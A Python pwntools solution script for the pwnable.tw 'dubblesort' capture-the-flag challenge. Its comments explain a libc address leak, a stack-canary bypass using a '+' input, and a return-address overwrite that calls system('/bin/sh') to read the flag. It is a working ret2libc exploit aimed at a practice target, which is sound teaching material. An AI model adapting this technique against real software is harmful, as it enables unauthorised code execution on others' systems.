from pwn import *
import time

s = remote("chall.pwnable.tw", 10101)
#s = process("./dubblesort", env={'LD_PRELOAD':'./libc_32.so.6'})

_ = s.recv()

libc = ELF("libc_32.so.6")

# get offset of system function in libc file
# manual: readelf -s ./libc_32.so.6 | grep system
system_off = libc.symbols['system']

# find offset of "/bin/sh" in libc file
# manual: strings -tx ./libc_32.so.6 | grep /bin/sh
binsh_off = libc.search("/bin/sh\x00").next()

# get offset of .got.plt section in libc file
# manual: readelf -S ./libc_32.so.6 | grep .got.plt
gotplt_off = libc.get_section_by_name(".got.plt").header.sh_addr

'''
There is a weird value in the 7th offset from name variable (assume this number is a),
after checking with vmmap we know that value belongs to file /lib/i386-linux-gnu/libc-2.23.so,
and with hexdump we also know the first value of that libc file is libc base address (assume b),
and if we take b - a = c, that c number will belong to a unknown section header.
Checking with readelf -S /lib/i386-linux-gnu/libc-2.23.so | grep $c, 
we know that number belongs to .got.plt section.
So now, we have gotplt.offset from libc file and gotplt.addr from the 7th offset,
===> we will have libc base address 
===> system_addr and binsh_addr to exploit
NOTE: if we have libc file, we can find a lot of thing in that file, but we just have offset,
somehow we must have libc base address ...
'''

# leak the value in the 7th offset
name = "a"*0x18
s.sendline(name)
gotplt_addr = int(s.recv()[30:34][::-1].encode("hex"), 16) - 0xa

# from gotplt_addr we will have system_addr and binsh_addr
base_addr = gotplt_addr - gotplt_off
system_addr = base_addr + system_off
binsh_addr = base_addr + binsh_off

# the amount of number we want to sort in the stack
# here is the vulnerability helping us change meta-data in stack
count = 35
s.sendline(str(count))

# overwrite array and name variable with zero (or the other number as long as < unknown canary value)
for i in range(0, 24):
	s.sendline("0")

# the "+" character will preverse canary value
# should remember that character (+/-) ( %u / %d) because that is the way we can trick canary and passby it
s.sendline("+")

# overwrite return address
for i in range(0,8):
	s.sendline(str(system_addr))

# make argv for system() function
for i in range(0,2):
	s.sendline(str(binsh_addr))

s.recv()
time.sleep(3)
s.recv()	

s.sendline("cat /home/dubblesort/flag")		
print s.recv()

s.close()

'''
Abstract:
+ Step 1: leak an important value by name variable
+ Step 2: Sort and overwrite stack memory in the way we want
'''
